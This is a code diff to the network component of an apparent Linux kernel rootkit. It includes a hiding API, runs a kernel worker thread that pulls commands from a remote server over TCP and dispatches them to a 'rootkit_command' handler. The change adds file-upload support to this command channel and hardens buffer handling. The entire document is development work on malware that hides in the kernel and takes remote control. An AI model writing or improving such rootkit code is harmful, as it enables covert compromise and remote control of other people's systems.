@@ -1,6 +1,7 @@
 #include "hide_api.h"
 #include "network.h"
 #include "sysinfo.h"
+#include "upload.h"
 
 static bool is_auth = false;
 static struct task_struct *network_worker_thread = NULL;
@@ -37,10 +38,18 @@ static bool receive_loop(char *recv_buffer) {
     unsigned failure_count = 0, empty_count = 0;
 
     while (!kthread_should_stop()) {
+
         // Clear the buffer before receiving
         memset(recv_buffer, 0, RCV_CMD_BUFFER_SIZE);
 
-        if (receive_from_server(recv_buffer, RCV_CMD_BUFFER_SIZE) == -FAILURE) {
+        int len = receive_from_server(recv_buffer, RCV_CMD_BUFFER_SIZE);
+        if (receiving_file) {
+            failure_count = 0;
+            msleep(TIMEOUT_BEFORE_RETRY);
+            continue;
+        }
+
+        if (len <= 0) {
             if (++failure_count > MAX_MSG_SEND_OR_RECEIVE_ERROR)
                 return false;
             msleep(TIMEOUT_BEFORE_RETRY);
@@ -53,11 +62,15 @@ static bool receive_loop(char *recv_buffer) {
             continue;
         }
 
+        if (len < RCV_CMD_BUFFER_SIZE)
+            recv_buffer[len] = '\0';
+        else
+            recv_buffer[RCV_CMD_BUFFER_SIZE - 1] = '\0';
         failure_count = empty_count = 0;
-        
+
         DBG_MSG("network_worker: received message: %s\n", recv_buffer);
         if (strcmp(recv_buffer, "\n") != 0) {
-            rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE, TCP);
+            rootkit_command(recv_buffer, len + 1, TCP);
         }
     }
 
@@ -91,7 +104,7 @@ static int network_worker(void *data) {
             continue;
         }
 
-        recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
+        recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE + 1, GFP_KERNEL);
         if (!recv_buffer) {
             ERR_MSG("network_worker: failed to allocate recv_buffer\n");
             break;
